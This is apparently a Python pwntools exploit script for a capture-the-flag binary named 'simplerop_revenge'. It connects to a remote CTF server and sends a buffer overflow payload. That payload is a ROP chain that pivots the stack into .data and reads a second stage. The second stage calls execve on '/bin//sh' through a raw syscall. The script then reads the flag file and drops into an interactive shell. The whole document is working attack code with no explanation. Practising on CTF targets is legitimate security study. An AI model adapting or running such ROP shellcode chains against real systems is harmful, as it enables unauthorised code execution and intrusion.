import time
from pwn import *
from struct import pack
LOCAL = False
binary = 'simplerop_revenge'

r = None
if LOCAL:
    r = process(binary)
else:
    r = remote('csie.ctf.tw', 10130)

# Padding goes here
p = 'A' * 40
p += pack('<Q', 0x00000000004427e6) # pop rdx; ret
p += pack('<Q', 0x500)
p += pack('<Q', 0x0000000000401577) # pop rsi ; ret
p += pack('<Q', 0x00000000006c9a20) # @data.
p += pack('<Q', 0x000000000043f3b0) # read
p += pack('<Q', 0x00000000004017a7) # pop rbp ; ret
p += pack('<Q', 0x00000000006c9a28) # @data.
p += pack('<Q', 0x0000000000400988) # set rsp to rbp; pop rbp; ret

print len(p)

r.sendline(p)
time.sleep(0.2)

p = '/bin//sh'
p += pack('<Q', 0x0)
p += pack('<Q', 0x0000000000401456) # pop rdi ; ret
p += pack('<Q', 0x00000000006c9a20) # @ .data
p += pack('<Q', 0x0000000000401577) # pop rsi ; ret
p += pack('<Q', 0x00000000006c9a28) # @ .data + 8
p += pack('<Q', 0x0000000000478516) # pop rax ; pop rdx ; pop rbx ; ret
p += pack('<Q', 0x3b)
p += pack('<Q', 0x00000000006c9a28) # @ .data + 8
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x00000000004671b5) # syscall ; ret
r.sendline(p)

time.sleep(0.2)
r.sendline('cat /home/' + binary + '/flag')

r.interactive()
